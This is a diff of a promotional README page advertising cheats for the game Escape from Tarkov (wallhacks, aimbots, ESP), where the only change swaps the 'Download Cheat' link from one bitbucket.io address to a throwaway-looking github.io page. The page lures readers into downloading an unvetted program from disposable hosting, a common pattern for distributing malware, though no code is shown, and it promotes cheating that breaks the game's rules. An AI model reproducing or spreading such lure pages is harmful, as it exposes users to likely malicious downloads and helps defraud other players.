@@ -2,7 +2,7 @@
 
 **Tired of being clapped by chads with thermal scopes? Want to turn Tarkov into your personal loot farm? With the right Tarkov cheat setup, you’ll dominate raids with wallhacks, no recoil, ESP overlays, and aimbots that lock onto skulls instantly.**
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload20.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Tarkov-Cheat-qyja1.github.io/.github)
 ---
 
 ## 💡 What Is a Tarkov Cheat?
